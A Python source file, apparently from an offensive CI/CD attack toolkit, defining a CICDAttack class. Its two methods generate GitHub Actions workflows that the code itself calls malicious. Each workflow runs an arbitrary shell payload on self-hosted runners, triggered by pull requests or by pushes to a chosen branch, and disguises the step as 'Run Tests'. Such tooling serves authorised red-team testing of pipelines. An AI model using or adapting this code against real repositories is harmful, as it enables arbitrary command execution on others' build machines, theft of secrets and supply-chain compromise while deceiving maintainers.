import yaml


class CICDAttack():
    """Class to encapsulate helper methods for attack features. Functionality
    here will focus on data processing and payload creation/management as
    opposed to API / Git interaction.
    """

    @staticmethod
    def create_malicious_yml(payload: str, workflow_name: str = 'Testing'):
        """Creates a malicious YML file containing a shell execution payload
        that will run on the self hosted runner.

        Args:
            payload (str): Shell command to execute on the runner host as
            part of the malicious yml file.
            workflow_name (str, optional): Name of the self-hosted
            workflow that will require approval by default on
            fork pull request repositories. Default 'Testing'.

        Returns:
            str: Workflow yaml file containing simple payload.
        """
        yaml_file = {}

        yaml_file['name'] = workflow_name
        yaml_file['on'] = ['pull_request']

        test_job = {
            'runs-on': ['self-hosted'],
            'steps': [
                {
                    'name': 'Run Tests',
                    'run': payload
                }
            ]
        }
        yaml_file['jobs'] = {'testing': test_job}

        return yaml.dump(yaml_file, sort_keys=False)

    @staticmethod
    def create_push_yml(payload: str, branch_name: str):
        """Create a malicious yaml file that will trigger on push to a
        specific branch.

        Args:
            payload (str): Command to be executed as part of the 'run' payload.
            branch_name (str): Name of the branch for on: push trigger.

        Returns:
            str: Workflow yaml file containing the payload.
        """
        yaml_file = {}

        yaml_file['name'] = branch_name
        yaml_file['on'] = {'push': {"branches": branch_name}}

        test_job = {
            'runs-on': ['self-hosted'],
            'steps': [
                {
                    'name': 'Run Tests',
                    'run': payload
                }
            ]
        }
        yaml_file['jobs'] = {'testing': test_job}

        return yaml.dump(yaml_file, sort_keys=False)
